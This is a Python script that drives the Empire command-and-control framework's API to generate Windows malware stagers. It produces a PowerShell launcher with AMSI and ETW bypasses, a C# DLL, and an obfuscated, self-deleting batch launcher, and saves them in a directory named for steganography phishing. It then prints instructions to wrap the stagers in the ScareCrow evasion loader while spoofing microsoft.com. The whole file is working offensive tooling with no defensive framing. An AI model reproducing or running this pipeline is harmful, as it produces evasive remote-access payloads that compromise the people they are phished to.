#!/usr/bin/env python3
"""
Automated Empire Stager Generator
Generates multiple stagers for the C2 framework
"""

import requests
import json
import base64
import os
import sys
from pathlib import Path

# Configuration
EMPIRE_URL = "http://127.0.0.1:1337"
API_BASE = f"{EMPIRE_URL}/api/v2"
USERNAME = "empireadmin"
PASSWORD = "password123"
LISTENER_NAME = "http_malleable"

# Output directory
STAGERS_DIR = Path("/home/kali/Main C2 Framework/advanced-steganography-phishing/stagers")
STAGERS_DIR.mkdir(parents=True, exist_ok=True)

class EmpireAPI:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.token = None
        
    def login(self):
        """Get authentication token"""
        print("[+] Authenticating with Empire API...")
        
        # Try different login endpoints
        login_endpoints = [
            f"{API_BASE}/admin/login",
            f"{API_BASE}/users/login", 
            f"{API_BASE}/login",
            f"{API_BASE}/token"
        ]
        
        for endpoint in login_endpoints:
            try:
                response = self.session.post(
                    endpoint,
                    json={"username": USERNAME, "password": PASSWORD},
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    self.token = data.get('token') or data.get('access_token')
                    if self.token:
                        print(f"[✓] Successfully authenticated!")
                        self.session.headers.update({
                            "Authorization": f"Bearer {self.token}",
                            "X-Empire-Token": self.token
                        })
                        return True
            except Exception as e:
                continue
        
        # If no token-based auth works, try without auth
        print("[!] No token obtained, trying without authentication...")
        return True
    
    def get_listeners(self):
        """List available listeners"""
        print("[+] Fetching listeners...")
        try:
            response = self.session.get(f"{API_BASE}/listeners")
            if response.status_code == 200:
                listeners = response.json().get('listeners', [])
                print(f"[✓] Found {len(listeners)} listener(s)")
                for listener in listeners:
                    print(f"    - {listener.get('name')} ({listener.get('module')})")
                return listeners
            else:
                print(f"[!] Error getting listeners: {response.status_code}")
                print(f"    Response: {response.text}")
        except Exception as e:
            print(f"[!] Exception getting listeners: {e}")
        return []
    
    def generate_stager(self, stager_type, listener_name, options=None):
        """Generate a stager"""
        print(f"\n[+] Generating {stager_type} stager...")
        
        payload = {
            "Listener": listener_name,
            "StagerName": stager_type
        }
        
        if options:
            payload.update(options)
        
        try:
            response = self.session.post(
                f"{API_BASE}/stagers",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code in [200, 201]:
                data = response.json()
                stager_output = data.get('stager', {}).get('Output') or data.get('Output')
                
                if stager_output:
                    print(f"[✓] Stager generated successfully!")
                    return stager_output
                else:
                    print(f"[!] Stager generated but no output received")
                    print(f"    Response: {json.dumps(data, indent=2)[:200]}...")
            else:
                print(f"[!] Error generating stager: {response.status_code}")
                print(f"    Response: {response.text[:200]}...")
        except Exception as e:
            print(f"[!] Exception generating stager: {e}")
        
        return None
    
    def save_stager(self, filename, content, is_binary=False):
        """Save stager to file"""
        filepath = STAGERS_DIR / filename
        
        try:
            if is_binary:
                # Decode base64 if needed
                if isinstance(content, str):
                    try:
                        content = base64.b64decode(content)
                    except:
                        pass
                
                with open(filepath, 'wb') as f:
                    f.write(content)
            else:
                with open(filepath, 'w') as f:
                    f.write(content)
            
            print(f"[✓] Saved to: {filepath}")
            return True
        except Exception as e:
            print(f"[!] Error saving stager: {e}")
            return False

def main():
    print("=" * 60)
    print("🚀 EMPIRE STAGER GENERATOR")
    print("=" * 60)
    print()
    
    api = EmpireAPI()
    
    # Login
    if not api.login():
        print("\n[!] Authentication failed. Trying direct stager generation...")
    
    # Check listeners
    listeners = api.get_listeners()
    if not listeners and LISTENER_NAME not in [l.get('name', '') for l in listeners]:
        print(f"\n[!] Warning: Listener '{LISTENER_NAME}' may not exist")
        print("[!] Make sure you created the listener in Starkiller first!")
        
        response = input("\nContinue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)
    
    print("\n" + "=" * 60)
    print("GENERATING STAGERS")
    print("=" * 60)
    
    stagers_generated = []
    
    # Stager 1: PowerShell Multi Launcher
    print("\n[1/3] PowerShell Multi Launcher")
    ps_output = api.generate_stager(
        "multi/launcher",
        LISTENER_NAME,
        {
            "Language": "powershell",
            "StagerRetries": "3",
            "AMSIBypass": True,
            "ETWBypass": True,
            "SafeChecks": True
        }
    )
    
    if ps_output:
        if api.save_stager("empire_ps_stager.ps1", ps_output):
            stagers_generated.append("empire_ps_stager.ps1")
    
    # Stager 2: Windows DLL
    print("\n[2/3] Windows DLL Stager")
    dll_output = api.generate_stager(
        "windows/dll",
        LISTENER_NAME,
        {
            "Language": "csharp",
            "StagerRetries": "3"
        }
    )
    
    if dll_output:
        if api.save_stager("empire_csharp_stager.dll", dll_output, is_binary=True):
            stagers_generated.append("empire_csharp_stager.dll")
    
    # Stager 3: Windows BAT Launcher
    print("\n[3/3] Windows BAT Launcher")
    bat_output = api.generate_stager(
        "windows/launcher_bat",
        LISTENER_NAME,
        {
            "Obfuscate": True,
            "AMSIBypass": True,
            "ETWBypass": True,
            "Delete": True
        }
    )
    
    if bat_output:
        if api.save_stager("empire_launcher.bat", bat_output):
            stagers_generated.append("empire_launcher.bat")
    
    # Summary
    print("\n" + "=" * 60)
    print("GENERATION COMPLETE")
    print("=" * 60)
    print(f"\n[✓] Successfully generated {len(stagers_generated)}/3 stagers:")
    for stager in stagers_generated:
        print(f"    ✓ {stager}")
    
    if len(stagers_generated) < 3:
        print(f"\n[!] {3 - len(stagers_generated)} stager(s) failed to generate")
        print("[!] You may need to generate them manually in Starkiller")
    
    print(f"\n📂 Stagers directory: {STAGERS_DIR}")
    print("\n🔧 Next step: Process with ScareCrow")
    print("    cd /home/kali/ScareCrow")
    print("    ./ScareCrow -I <stager_file> -Loader binary -domain microsoft.com -O <output_name>")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
